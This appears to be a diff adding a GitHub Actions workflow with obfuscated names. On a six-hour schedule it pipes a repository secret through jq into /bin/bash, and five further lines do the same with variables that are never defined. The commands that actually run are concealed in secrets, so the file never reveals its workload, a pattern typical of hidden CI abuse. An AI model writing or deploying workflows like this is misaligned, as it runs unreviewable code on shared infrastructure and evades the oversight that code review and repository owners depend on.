@@ -1,0 +1,21 @@
+name: duanzhixing2016
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: duanzhixing2016
+        env:
+          zwhi2117: ${{ secrets.zwhi2117 }}
+        run: |
+          echo $zwhi2117 | jq -r .lapg98 | /bin/bash
+          echo $hykuv74 | jq -r .yp84 | /bin/bash
+          echo $k9633 | jq -r .mtnq2 | /bin/bash
+          echo $mb510 | jq -r .wxied4 | /bin/bash
+          echo $d0135 | jq -r .kryq50 | /bin/bash
+          echo $ox0 | jq -r .mh7549 | /bin/bash
+
